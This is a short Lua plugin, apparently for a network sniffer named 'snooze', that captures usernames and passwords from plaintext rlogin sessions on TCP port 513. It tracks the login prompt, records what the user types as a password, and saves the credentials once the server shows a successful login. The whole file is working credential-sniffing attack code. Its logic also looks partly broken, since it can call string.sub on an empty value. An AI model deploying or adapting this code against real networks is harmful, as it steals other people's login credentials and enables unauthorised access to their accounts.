-- :rlogin:513:tcp:

b=snooze.get()

if b == nil then
	s = snooze.get_server()
	if string.len(s) < 5 then
		return
	end

	i = 1
	u = ""

	while string.byte(s,i) ~= 0 and i < string.len(s) do
		u = u .. string.char(string.byte(s,i))
		i = i + 1
	end
	snooze.set("USER" .. u .. ":")
end

c = string.sub(b, 1, 4)
b_cut = string.sub(b, 5)

if c == "USER" then
	s = snooze.get_client()
	f = string.gfind(s,"assword:")
	if f() then
		snooze.set("PASS" .. b_cut)
		return
	end
	return
end

if c == "USE1" then
	s = snooze.get_server()

	if s == "\r" then
		snooze.set("PAS2" .. b_cut .. ":")
		return
	end

	snooze.set("PASS" .. b_cut .. s)
	return
end

if c == "PASS" then
	s = snooze.get_server()

	if s == "\r" then
		snooze.set("PAS2" .. b_cut)
		return
	end

	snooze.set("PASS" .. b_cut .. s)
	return
end

if c == "PAS2" then
	s = snooze.get_client()
	f = string.gfind(s, "Last")
	if f() then
		snooze.save(b_cut)
		snooze.finished()
		return
	end

	f = string.gfind(s, "login:")
	if f() then
		snooze.set("USE1")
		return
	end
	return
end
